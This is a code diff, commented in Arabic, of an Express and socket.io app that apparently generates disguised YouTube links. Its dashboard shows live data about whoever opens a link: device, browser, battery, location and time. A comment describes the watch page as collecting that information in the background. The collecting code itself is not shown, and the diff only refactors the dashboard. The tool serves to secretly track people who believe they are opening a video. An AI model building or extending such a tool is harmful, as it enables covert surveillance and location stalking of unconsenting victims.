@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم الرئيسية
+// 1. لوحة التحكم الرئيسية لإنشاء الرابط
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -30,7 +30,7 @@ app.get('/', (req, res) => {
         <h2>📺 منشئ روابط يوتيوب الذكية</h2>
         <div class="card">
             <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
-            <input type="text" id="ytUrlInput" placeholder="https://www.youtube.com/watch?v=..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+            <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
             <br><br>
             <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
@@ -50,7 +50,6 @@ app.get('/', (req, res) => {
                 const ytUrl = document.getElementById('ytUrlInput').value;
                 let videoId = "dQw4w9WgXcQ";
                 
-                // استخراج معرف فيديو اليوتيوب
                 if (ytUrl.includes('youtu.be/')) {
                     videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
                 } else if (ytUrl.includes('v=')) {
@@ -60,11 +59,8 @@ app.get('/', (req, res) => {
                 const uniqueId = Math.random().toString(36).substring(2, 8);
                 const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                 
-                const linkInput = document.getElementById('linkInput');
-                linkInput.value = fullUrl;
-                
-                const container = document.getElementById('linkContainer');
-                container.style.display = 'block';
+                document.getElementById('linkInput').value = fullUrl;
+                document.getElementById('linkContainer').style.display = 'block';
             }
 
             const socket = io();
@@ -74,13 +70,11 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = `
-                    <strong>📱 الجهاز:</strong> \${data.deviceName}<br>
-                    <strong>🌐 المتصفح:</strong> \${data.platform}<br>
-                    <strong>🔋 الشحن:</strong> \${data.battery}<br>
-                    <strong>📍 الموقع:</strong> \${data.location}<br>
-                    <strong>🕒 الوقت:</strong> \${data.time}
-                `;
+                box.innerHTML = '<strong>📱 الجهاز:</strong> ' + data.deviceName + '<br>' +
+                                '<strong>🌐 المتصفح:</strong> ' + data.platform + '<br>' +
+                                '<strong>🔋 الشحن:</strong> ' + data.battery + '<br>' +
+                                '<strong>📍 الموقع:</strong> ' + data.location + '<br>' +
+                                '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
             });
         </script>
@@ -89,7 +83,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة عرض اليوتيوب وجمع المعلومات
+// 2. صفحة عرض اليوتيوب وجمع المعلومات في الخلفية
 app.get('/watch/:id', (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
   res.send(`
